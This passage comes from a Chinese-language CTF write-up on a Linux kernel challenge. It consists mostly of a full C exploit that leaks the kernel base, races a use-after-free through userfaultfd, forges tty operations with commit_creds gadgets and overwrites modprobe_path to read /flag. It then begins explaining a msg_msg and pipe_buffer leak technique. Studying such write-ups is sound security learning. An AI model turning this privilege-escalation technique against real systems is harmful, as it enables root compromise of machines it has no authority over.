class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> fake_ops_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> gadget = <span class="number">0xffffffff817d1e76</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"><span class="type">size_t</span> magic_gadget = <span class="number">0xffffffff810f69f1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = kernel_base + <span class="number">0x13e8030</span> - <span class="number">0x60</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = fake_ops_addr + <span class="number">0x40</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = commit_creds;</span><br><span class="line">        uffd_buf[<span class="number">5</span>] = init_creds;</span><br><span class="line">        uffd_buf[<span class="number">7</span>] = magic_gadget;</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[5]&quot;</span>, uffd_buf[<span class="number">5</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x50</span>];</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;# make fake file magic not found&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;get flag&quot;</span>);</span><br><span class="line">    <span class="type">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open flag failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(flag_fd, data, <span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flag is: %s\n&quot;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x19e1180</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    magic_gadget += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line">    hexx(<span class="string">&quot;magic_gadget&quot;</span>, magic_gadget);</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line">    </span><br><span class="line">    work_for_cpu_fn  = kernel_base + <span class="number">0x8c360</span>;</span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">35</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    fake_ops_addr = heap_addr - <span class="number">0x68</span>;</span><br><span class="line">    hexx(<span class="string">&quot;fake_ops_addr&quot;</span>, fake_ops_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(tty_fd, <span class="number">0x68732f706d742f</span>, modprobe_path - <span class="number">8</span>);</span><br><span class="line">    ioctl(tty_fd, <span class="number">0x68732f</span>, modprobe_path - <span class="number">4</span>);</span><br><span class="line">    get_flag();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求解效果"><a href="#求解效果" class="headerlink" title="求解效果"></a>求解效果</h3><img src="/2024/10/07/kno_puts/5.png" class="" title="我的图图呢">  <h2 id="userfaultfd-msg-msg-pipe-buffer"><a href="#userfaultfd-msg-msg-pipe-buffer" class="headerlink" title="userfaultfd + msg_msg + pipe_buffer"></a>userfaultfd + msg_msg + pipe_buffer</h2><h3 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h3><p>现在我们在上面的情况中加点限制，即 <code>/sys/kernel/notes</code> 里面不再给我们提供内核地址，那我们能否继续获取内核的地址呢？答案是可以的，这里需要 <code>msg_msg</code> 和 <code>pipe_buffer</code> 两个结构体来相互协作，因为他们都可以让堆管理器取出 <code>0x400</code> 大小的 <code>objcet</code>。可能有的师傅会问我这里为什么不能使用 <code>tty_struct</code>，这里我后面会进行解释。</p><p>通过调试我们可以发现内核并没有开启 <code>CONFIG_SLAB_HARDENED=y</code> 选项，可就是说我们堆块的布局可预测。当然如果开启了我们也可以通过堆喷来达到我们想要的效果。我们可以相邻的布局一个 <code>msg_msg</code> 结构体 和一个 <code>pipe_buffer</code> 数组，然后通过 <code>uaf</code> 来将 msg_msg.<font style="color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);">m_ts 来改大，同时将 </font><font style="color:rgb(0, 0, 0);">msg_msgseg</font><font style="color:rgb(166, 127, 89);">*</font><font style="color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);">next 指向 <code>msg_msg +0x300</code> 的位置（后面解释），这个时候就可以实现结构体的越界读。同时 <code>msg_msg</code> 结构体的下方有个 <code>pipe_buffer</code> 数组，可以通过该结构的 <code>ops</code> 来获取到内核的地址。此时的堆布局如下：</font></p><img src="/2024/10/07/kno_puts/6.png" class="" title="我的图图呢">  <p>当我们调用 <code>msgrcv</code> 来读取 <code>msg_msg</code> 中的内容时，内核会调用 <code>free_msg</code> 遍历 <code>next</code> 依次释放 <code>msg_send</code> 并最终释放 <code>msg_msg</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free_msg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">security_msg_msg_free(msg);</span><br><span class="line"></span><br><span class="line">seg = msg-&gt;next;</span><br><span class="line">kfree(msg);</span><br><span class="line"><span class="keyword">while</span> (seg != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">tmp</span> =</span> seg-&gt;next;</span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line">kfree(seg);</span><br><span class="line">seg = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其遍历的终止条件为 <code>next</code> 指针为空。由于我们 <code>msg_msg</code> 的 <code>next</code> 指针指向 <code>msg_msg + 0x300</code> 的位置（注意，这个位置必须为空，这是为了终止 